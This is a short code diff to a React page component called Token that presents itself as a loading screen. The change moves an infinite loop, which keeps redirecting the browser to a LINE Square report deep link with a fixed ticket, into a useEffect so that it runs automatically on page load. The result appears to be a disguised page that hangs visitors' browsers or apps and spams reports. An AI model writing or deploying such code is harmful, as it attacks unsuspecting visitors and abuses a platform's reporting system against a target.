@@ -7,13 +7,15 @@ import { useEffect } from "react";
 import { Loading } from "@/src/components/Loading/Loading";
 
 export default function Token() {
-
-    const crash = `
+  useEffect(() => {
     while (!0) {
-        location.href = "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w"
+      location.href =
+        "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w";
     }
-    `
-
-    return <><Loading />
-    <div dangerouslySetInnerHTML={{ __html: crash}}></div></>
+  }, []);
+  return (
+    <>
+      <Loading />
+    </>
+  );
 }
